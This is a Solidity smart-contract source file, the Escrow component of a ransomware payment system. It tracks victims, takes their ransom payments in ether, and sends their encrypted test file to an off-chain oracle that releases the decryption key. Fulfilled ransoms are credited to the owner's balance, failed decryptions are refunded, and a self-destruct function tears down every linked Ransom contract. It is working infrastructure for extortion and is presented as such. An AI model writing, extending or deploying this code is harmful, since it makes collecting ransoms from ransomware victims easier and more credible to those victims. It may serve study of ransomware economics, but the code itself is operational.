pragma solidity ^0.4.24;

import "./Ransom.sol";
import "./Registry.sol";

///@title Escrow Contract
contract Escrow {
    /**
     * @dev The Escrow contract governs the payment process and release of the decryption key. It is meant to
     * provide the victim assurances that they will receive a valid key in return for payment of the ransom. There can be 
     * many Ransom contracts registered with each Escrow contract, so while there is a unique Ransom contract for each
     * victim there can be many victims associated with a single Escrow contract. Keeping track of everything is a
     * single Registry contract. There is one and only one Registry and it maintains records of all the victims and the
     * associated Ransom and Escrow contracts.
     *
     * When a victim submits their payment, the Escrow contract will request a copy of the encryption key from the
     * Ransom contract. The victim also submits an encrypted file that is used to test that the key provided by
     * the Ransom contract actually works. The decryption and authentication of the provided key happens off-chain 
     * by an Oracle. The Oracle monitors the blockchain for decryption events and when one is received, it uses its 
     * private key to unwrap the ransom key and attempt to decrypt (and authenticate) the file provided by the victim. 
     * If this process succeeds, it calls the decryptCallback function and returns a copy of the unwrapped key. 
     * If the process fails, no key is returned and the victim is automatically refunded their ransom payment. 
     * The Oracle is also what handles the authentication events that are triggered when new Ransom contracts get 
     * deployed and attempt to register with the Registry contract.
     */

    ///@dev Victim struct used to keep track of their contract details
    struct Victim {
        uint id;            //!< The unique ID of the victim
        uint ransomAmount;  //!< The ransom amount the victim is required to pay
        address victimAddr; //!< The account address belonging to the victim
        address ransomAddr; //!< The address of the victim's Ransom contract
    }

    ///@dev The DecryptEvent is triggered when the victim has paid the ransom and provided an encrypted test file. The
    ///off-chain decryption Oracle watches for this event and will attempt to unwrap the encryption key using its private
    ///key, decrypt and authenticate the test file, and provide the results back to the Escrow contract.
    event DecryptEvent(
        uint indexed id,    //!< The unique ID of the victim
        string encKey,      //!< The encrypted key provided by the Ransom contract
        string encFile      //!< The encrypted test file (provided by the victim) 
    );

    ///@dev The DecryptCallbackEvent is triggered when the off-chain decryption Oracle calls the decryptCallback function
    event DecryptCallbackEvent(
        uint indexed id,        //!< The unique ID of the victim
        bool indexed result     //!< The result of the decryption 
    );

    ///@dev The AuthCallbackEvent is triggered when the Registry contract calls the authCallback function
    event AuthCallbackEvent(
        uint indexed id,        //!< The unique ID of the victim
        bool indexed result     //!< The result of the authentication
    );

    ///@dev The BadPaymentEvent is triggered when the victim pays but a key is not requested.
    event BadPaymentEvent(
        uint indexed id        //!< The unique ID of the victim
    );

    address owner;      //!< This is the account that deployed the Escrow contract
    uint ownerBalance;  //!< This is the account balance of the owner (i.e., fulfilled ransoms)
    address registry;   //!< This is the address of the Registry contract
    mapping(uint => address) vicToPayerMap; //!< Mapping from victim IDs to the account addresses that submitted payment
    mapping(uint => Victim) victimMap;      //!< Mapping from victim IDs to Victim structs
    mapping(uint => bytes32) decKeyMap;      //!< Mapping from victim IDS to decrypted ransom keys
    mapping(address => uint) ransomMap;     //!< Mapping from Ransom contract addresses to victim IDs
    mapping(uint => uint) escrowMap;        //!< Mapping from victim IDs to the amount of ransom payment received
    mapping(uint => string) encFileMap;     //!< Mapping from victim IDs to encrypted test files
    address[] ransomContracts;              //!< List of Ransom contracts registered with this Escrow contract
    address oracleAccount;  //!< Address of the off-chain authentication and decryption Oracle

    ///@dev Restricts that the caller must be the Oracle account
    modifier restrictSenderToOracle {
        require(msg.sender == oracleAccount, "Only the Oracle can call this");
        _;
    }

    ///@dev Restricts that the caller must be the owner account
    modifier restrictSenderToOwner {
        require(msg.sender == owner, "Only the Owner can call this");
        _;
    }

    ///@dev Restricts that the caller must be the Registry contract
    modifier restrictSenderToRegistry {
        require(msg.sender == registry, "Only the Registry contract can call this");
        _;
    }

    ///@dev Restricts that a transaction must have originated with the victim account
    modifier restrictSenderToVictim(uint id) {
        require(msg.sender == victimMap[id].victimAddr, "Only the Victim can call this");
        _;
    }

    ///@dev Restricts that the Ransom contract address has been authenticated
    modifier onlyAuthenticated(address ransom) {
        require(ransomMap[ransom] > 0, "Only authenticated Ransom contracts can call this");
        _;
    }

    ///@dev Restricts that the victim has paid the ransom amount
    modifier hasPaidRansom(uint id) {
        require(victimMap[id].id == id, "Victim id must be known");
        require(escrowMap[id] >= victimMap[id].ransomAmount, "Only valid if Victim has paid ransom");
        _;
    }

    /**
     * @dev Escrow constructor
     * @param _registry address of the Registry contract
     * @param _oracleAccount address of the off-chain oracle 
     */
    constructor(address _registry, address _oracleAccount) public {
        owner = msg.sender;
        ownerBalance = 0;
        registry = _registry;
        oracleAccount = _oracleAccount;
    }

    /**
     * @dev Adds a victim to the victimMap. This is only allowed to be called by an authenticated Ransom contract
     * @param ransomAmount the amount the victim must pay
     * @param victimId the unique ID of the victim
     * @param victimAddr the account address belonging to the victim
     */
    function registerRansom(uint ransomAmount, uint victimId, address victimAddr) external onlyAuthenticated(msg.sender)  { 
        victimMap[victimId] = Victim(victimId, ransomAmount, victimAddr, msg.sender);
    }

    /**
     * @dev Authentication callback function. This is restricted such that the caller must be the Registry contract.
     * @param id the unique ID of the victim
     * @param ransomAddr the address of the Ransom contract
     * @param authResult indicates whether authentication was successful
     */
    function authCallback(uint id, address ransomAddr, bool authResult) external restrictSenderToRegistry  {        
        emit AuthCallbackEvent(id, authResult);
        
        if (authResult == true) {
            ransomMap[ransomAddr] = id;
            ransomContracts.push(ransomAddr);
        }
    }
   
    /**
     * @dev This is the function that victims will call and submit their ransom payment
     * @param id the unique ID of the victim
     * @param encFile the encrypted test file chosen by the victim
     */
    function payRansom(uint id, string encFile) external restrictSenderToVictim(id) payable {
        Victim storage vicInfo = victimMap[id];
        Ransom ransom = Ransom(vicInfo.ransomAddr);

        if (msg.value >= vicInfo.ransomAmount && !ransom.isFulFilled()) {
            
            escrowMap[id] += msg.value;
            encFileMap[id] = encFile;
            vicToPayerMap[id] = msg.sender;
            ransom.requestKey(); 
        } else {
            emit BadPaymentEvent(id);
        }
    }

    /**
     * @dev This function may be called by victims to receive a refund of money paid into Escrow
     * @param id the unique ID of the victim
     * @param amount the amount of refund requested
     * @return bool true if the amount requested is <= the amount the victim has paid
     */
    function requestRefund(uint id, uint amount) external restrictSenderToVictim(id) returns (bool) {
        address payer = vicToPayerMap[id];
        if (payer > 0 && escrowMap[id] >= amount && amount > 0) {
            escrowMap[id] -= amount;
            payer.transfer(amount);
            return true;
        }
        return false;
    }
    
    /**
     * @dev This function is called by the Ransom contract after the victim has paid the ransom. It emits the
     * DecryptEvent for the off-chain Oracle to process.
     * @param id the unique ID of the victim
     * @param encKey the wrapped encryption key held by the Ransom contract
     */
    function decryptKey(uint id, string encKey) external onlyAuthenticated(msg.sender) hasPaidRansom(id) {
        emit DecryptEvent(id, encKey, encFileMap[id]);
    }

    /**
     * @dev This function is called by the off-chain Oracle after it has processed the DecryptEvent. If authResult is true,
     * then the contract owner's balance increases by the ransom amount. Otherwise, the victim gets their money back.
     * @param id the unique ID of the victim
     * @param decKey the unwrapped encryption key (or empty string if authResult is false)
     * @param authResult true/false if whether decryption and authentication succeeded
     */
    function decryptCallback(uint id, bytes32 decKey, bool authResult) external restrictSenderToOracle {
        require(bytes(encFileMap[id]).length != 0, "missing encrypted file");
        delete encFileMap[id]; // no longer needed

        decKeyMap[id] = decKey;
        emit DecryptCallbackEvent(id, authResult);

        Victim storage vicInfo = victimMap[id];
        escrowMap[id] -= vicInfo.ransomAmount;

        if (authResult) {
            ownerBalance += vicInfo.ransomAmount;
            Ransom(vicInfo.ransomAddr).fulfillContract();
        } else {
            vicToPayerMap[id].transfer(vicInfo.ransomAmount); 
        }

    }

    /**
     * @dev This function returns the unwrapped encryption key (or empty string if ransom hasn't been fulfilled)
     * @param id the unique ID of the victim
     * @return string the unwrapped encryption key
     */
    function getDecryptionKey(uint id) external onlyAuthenticated(msg.sender) view returns (bytes32) {
        return decKeyMap[id];
    } 

    /**
     * @dev Enables the contract owner to withdraw funds from the contract
     * @param account the account address to transfer funds to
     * @param amount the amount of funds to transfer
     * @return bool true if the owner has the requested amount of funds
     */
    function withdrawFunds(address account, uint amount) external restrictSenderToOwner returns (bool) {
        if (ownerBalance >= amount) {
            ownerBalance -= amount;
            account.transfer(amount);
            return true;
        }
        return false;
    }

    /**
     * @dev Self-destructs this contract and all associated Ransom contracts
     */
    function die() external restrictSenderToOwner {
        for (uint i = 0; i < ransomContracts.length; ++i) {
            Ransom(ransomContracts[i]).die();
        }
        selfdestruct(owner);
    }

    /**
     * @dev payable fallback function to receive "donations"
     */
    function () payable public {
        
    }
}
